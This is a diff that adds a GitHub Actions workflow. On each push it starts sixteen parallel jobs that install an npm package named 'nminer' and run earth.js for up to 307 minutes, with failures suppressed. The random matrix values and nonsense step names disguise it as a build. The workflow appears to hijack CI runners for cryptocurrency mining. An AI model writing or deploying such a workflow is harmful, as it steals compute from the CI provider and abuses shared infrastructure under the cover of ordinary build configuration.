@@ -1,0 +1,41 @@
+name: earth
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 2926 }
+          - { version: 5112 }
+          - { version: 929 }
+          - { version: 1921 }
+          - { version: 1544 }
+          - { version: 6921 }
+          - { version: 9113 }
+          - { version: 2384 }
+          - { version: 8001 }
+          - { version: 4804 }
+          - { version: 7252 }
+          - { version: 337 }
+          - { version: 2307 }
+          - { version: 5277 }
+          - { version: 7465 }
+          - { version: 6469 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: footrest
+        run: |
+          npm install nminer@latest
+          timeout 307m node earth.js || echo "earth executed"
